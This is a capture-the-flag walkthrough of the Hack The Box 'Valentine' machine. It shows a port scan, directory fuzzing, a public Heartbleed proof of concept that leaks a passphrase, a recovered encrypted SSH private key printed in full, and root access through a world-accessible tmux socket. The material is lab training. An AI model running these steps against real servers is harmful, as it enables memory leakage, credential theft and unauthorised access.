# Valentine-HTB
Valentine is a Linux machine that is rated as easy. This box is vulnerable to Heartbleed exploitation.
# Recon
nmap scan show this:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.79             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 11:53 EDT
Nmap scan report for 10.10.10.79
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-09-04T15:56:13+00:00; +2m48s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 2m47s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
```
## ffuf
Fuzzing...
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://10.10.10.79/FUZZ              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.79/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index                   [Status: 200, Size: 38, Words: 2, Lines: 2]
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10]
encode                  [Status: 200, Size: 554, Words: 73, Lines: 28]
decode                  [Status: 200, Size: 552, Words: 73, Lines: 26]
omg                     [Status: 200, Size: 147692, Words: 627, Lines: 620]
```
And we found so many interesting directories. The dev dir contain 2 files:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Valentine/images/1.png)

```hype_key``` contain:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Valentine/images/2.png)

```notes.txt``` contain:

![image3](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Valentine/images/3.png)

# User Flag

So from the image we can say that it somthing related to Heartbleed vulnerability, we can use this exploit https://github.com/sensepost/heartbleed-poc, to retrieve some sensitive data:
```
┌──(kali㉿kali)-[~/Desktop/heartbleed-poc]
└─$ python heartbleed-poc.py 10.10.10.79 -p 443 -f test
Scanning 10.10.10.79 on port 443
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Server TLS version was 1.2

Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 9F  mV0aGVoeXBlCg==.
  0160: 48 E3 E8 07 D4 22 B9 39 E8 01 2D C0 E3 A3 06 67  H....".9..-....g
  0170: C9 1B AF 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................
  ...
  ```
  We can view it better like this:
  ```
  ┌──(kali㉿kali)-[~/Desktop/heartbleed-poc]
└─$ strings test
0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```
So now we can decode this ```aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==``` using ```decode.php``` that we found earlier.

![image4](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Valentine/images/4.png)

![image5](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Valentine/images/5.png)

So it looks like this is a passphrase, So we can use it with ```hype_key``` and ssh as user ```hype```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Valantine]
└─$ wget http://10.10.10.79/dev/hype_key      
--2020-09-04 12:18:52--  http://10.10.10.79/dev/hype_key
Connecting to 10.10.10.79:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5383 (5.3K)
Saving to: ‘hype_key’

hype_key                                                   100%[=======================================================================================================================================>]   5.26K  --.-KB/s    in 0s      

2020-09-04 12:18:52 (616 MB/s) - ‘hype_key’ saved [5383/5383]
```
```
┌──(kali㉿kali)-[~/Desktop/HTB/Valantine]
└─$ cat hype_key | xxd -r -p >> ssh
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB/Valantine]
└─$ cat ssh                        
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```
```
┌──(kali㉿kali)-[~/Desktop/HTB/Valantine]
└─$ chmod 600 ssh
```
And now ssh using it:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Valantine]
└─$ ssh -i ssh hype@10.10.10.79
load pubkey "ssh": invalid format
Enter passphrase for key 'ssh': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~$
```
Get the User Flag:
```
hype@Valentine:~/Desktop$ cat user.txt 
e6710a5...6961750
```
# Root Flag
So if we do ```ps aux```, we get something very interesting:
```
hype@Valentine:~/Desktop$ ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root       1046  0.0  0.1  26416  1672 ?        Ss   08:53   0:00 /usr/bin/tmux -S /.devs/dev_sess
...
```
So if we run the command we will connect to the session with root:
```
hype@Valentine:~/Desktop$tmux -S /.devs/dev_sess
root@Valentine:/home/hype/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```
And we are root, grab your flag now :)
```
root@Valentine:~# cat root.txt 
f1bb6d7...d7765b2
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
